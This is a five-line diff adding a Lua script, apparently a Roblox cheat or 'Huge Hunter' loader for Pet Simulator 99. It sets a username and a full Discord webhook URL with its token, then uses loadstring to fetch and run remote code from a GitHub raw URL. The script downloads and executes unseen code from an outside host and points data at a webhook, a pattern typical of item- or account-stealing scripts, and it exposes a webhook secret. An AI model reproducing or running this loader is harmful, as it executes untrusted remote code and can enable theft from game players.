@@ -1,0 +1,5 @@
+
+Username = 'itlognabluw'-- << Your Username
+Webhook = 'https://discord.com/api/webhooks/1358650719502336100/Fwb9RuO5C9n9xRTXlxbysPOkwoIpktYM_RqUKir1PHYxu2z7RcVdnF1yjrW2BHRp-PKN'-- << Your Webhook
+loadstring(game:HttpGet("https://
+raw.githubusercontent.com/BestScript-dev/ps99/Huge-Hunter/refs/heads/main/Easy-Huge"))
